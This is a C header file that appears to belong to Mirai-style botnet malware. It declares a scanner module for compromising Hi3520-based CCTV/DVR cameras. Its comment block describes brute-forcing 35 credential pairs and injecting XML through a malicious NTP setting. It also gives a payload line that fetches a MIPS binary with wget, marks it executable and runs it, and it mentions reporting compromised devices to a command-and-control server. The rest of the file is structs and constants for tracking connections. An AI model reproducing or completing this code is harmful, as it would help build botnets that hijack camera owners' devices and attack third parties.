#ifndef _DVR_H
#define _DVR_H

#include "includes.h"

/* ============================================================================
 * DVR SCANNER MODULE - CCTV/DVR Camera Exploitation (Improved)
 * ============================================================================
 * Exploits Hi3520-based DVR cameras via HTTP Basic Auth + XML injection
 * Targets: CCTV/DVR cameras with /dvr/cmd or /cn/cmd endpoints
 * Method: POST with malicious NTP server configuration
 * Credentials: 35 username/password combinations
 * Payload: wget http://<server>/bins/axis.mips; chmod 777; execute
 * Reports successful compromises to C&C via SCAN_CB_PORT
 * ============================================================================ */

#define DVR_MAX_CONNS 64
#define DVR_CONNECTION_TIMEOUT 30
#define DVR_READ_TIMEOUT 20

struct dvr_credential {
    char *username;
    char *password;
};

struct dvr_connection {
    int fd;
    uint8_t state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    time_t last_recv;
    time_t connect_time;
    int cred_index;
    BOOL logged_in;
    char username[32];
    char password[32];
    char exploit_path[32];
    char rdbuf[4096];
    int rdbuf_pos;
};

void dvr_scanner_init(void);

#endif
